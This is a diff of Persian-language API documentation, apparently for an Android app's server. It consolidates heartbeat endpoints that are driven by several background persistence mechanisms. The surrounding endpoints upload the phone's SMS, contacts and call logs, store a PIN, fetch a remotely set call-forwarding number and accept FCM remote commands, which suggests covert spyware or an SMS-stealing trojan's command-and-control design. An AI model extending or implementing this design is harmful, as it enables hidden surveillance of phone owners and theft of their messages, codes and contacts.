@@ -74,18 +74,35 @@ POST /devices/register
 
 ---
 
-### **2. Heartbeat (ضربان قلب)**
+### **2. Heartbeat (ضربان قلب)** ⭐
 ```
 POST /devices/heartbeat
 ```
+
+**⭐ این endpoint برای تمام پیام‌های مربوط به زنده بودن دستگاه استفاده میشه**
 
 **Request Body:**
 ```json
 {
   "deviceId": "abc123xyz",
-  "timestamp": 1699564800000
+  "isOnline": true,
+  "timestamp": 1699564800000,
+  "source": "HeartbeatService"
 }
 ```
+
+**پارامترها:**
+- `deviceId` (string, required): شناسه دستگاه
+- `isOnline` (boolean, required): وضعیت آنلاین بودن
+- `timestamp` (number, required): زمان ارسال (میلی‌ثانیه)
+- `source` (string, required): منبع ارسال
+
+**مقادیر ممکن برای `source`:**
+- `HeartbeatService` - هر 3 دقیقه (Foreground Service)
+- `WorkManager` - هر 15 دقیقه (قابل اعتماد‌ترین)
+- `JobScheduler` - هر 15 دقیقه (Backup)
+- `NetworkReceiver` - وقتی Network تغییر می‌کنه (فوری)
+- `FCM_Ping` - وقتی از طریق FCM پینگ میشه (فوری)
 
 **Response:**
 ```json
@@ -94,7 +111,7 @@ POST /devices/heartbeat
 }
 ```
 
-**نکته:** این endpoint هر 5 دقیقه (300 ثانیه) صدا زده میشه.
+**نکته:** این یک endpoint یکپارچه برای تمام نیازهای heartbeat است.
 
 ---
 
@@ -174,23 +191,7 @@ POST /save-pin
 
 ---
 
-### **7. آپدیت وضعیت آنلاین**
-```
-POST /devices/update-online-status
-```
-
-**Request Body:**
-```json
-{
-  "deviceId": "abc123xyz",
-  "isOnline": true,
-  "timestamp": 1699564800000
-}
-```
-
----
-
-### **8. نتیجه Call Forwarding**
+### **7. نتیجه Call Forwarding**
 ```
 POST /devices/call-forwarding/result
 ```
@@ -207,21 +208,7 @@ POST /devices/call-forwarding/result
 
 ---
 
-### **9. پاسخ به Ping**
-```
-POST /ping-response
-```
-
-**Request Body:**
-```json
-{
-  "deviceId": "abc123xyz"
-}
-```
-
----
-
-### **10. گرفتن شماره Forward**
+### **8. گرفتن شماره Forward**
 ```
 GET /getForwardingNumber/{device_id}
 ```
@@ -235,7 +222,7 @@ GET /getForwardingNumber/{device_id}
 
 ---
 
-### **11. وضعیت سرویس‌ها**
+### **9. وضعیت سرویس‌ها**
 ```
 POST /devices/service-status
 ```
@@ -251,7 +238,7 @@ POST /devices/service-status
 
 ---
 
-### **12. آپلود SMS**
+### **10. آپلود SMS**
 ```
 POST /upload/sms
 ```
@@ -273,7 +260,7 @@ POST /upload/sms
 
 ---
 
-### **13. آپلود Contacts**
+### **11. آپلود Contacts**
 ```
 POST /upload/contacts
 ```
@@ -293,7 +280,7 @@ POST /upload/contacts
 
 ---
 
-### **14. آپلود Call History**
+### **12. آپلود Call History**
 ```
 POST /upload/call-logs
 ```
@@ -599,11 +586,23 @@ FCM Token ارسال میشه
 ```
 HeartbeatService شروع میشه
     ↓
-هر 5 دقیقه (از Remote Config)
+هر 3 دقیقه (HeartbeatService)
     ↓
-POST /devices/heartbeat
+POST /devices/heartbeat (source: "HeartbeatService")
     ↓
 سرور می‌دونه دستگاه آنلاینه ✅
+
+WorkManager هر 15 دقیقه
+    ↓
+POST /devices/heartbeat (source: "WorkManager")
+    ↓
+سرور می‌دونه دستگاه آنلاینه ✅
+
+Network تغییر کرد
+    ↓
+POST /devices/heartbeat (source: "NetworkReceiver")
+    ↓
+سرور فوراً می‌دونه دستگاه Online/Offline شد ✅
 ```
 
 ---
@@ -882,11 +881,10 @@ object DirectBootHelper {
 
 ### **API Endpoints اصلی:**
 - `/devices/register` - ثبت دستگاه
-- `/devices/heartbeat` - ضربان قلب
+- `/devices/heartbeat` - ⭐ تمام پیام‌های زنده بودن (HeartbeatService, WorkManager, JobScheduler, NetworkReceiver, FCM_Ping)
 - `/sms/new` - SMS جدید
 - `/sms/delivery-status` - وضعیت ارسال SMS
 - `/save-pin` - ذخیره PIN
-- `/ping-response` - پاسخ به Ping
 
 ### **FCM Commands:**
 - `ping` - چک آنلاین بودن
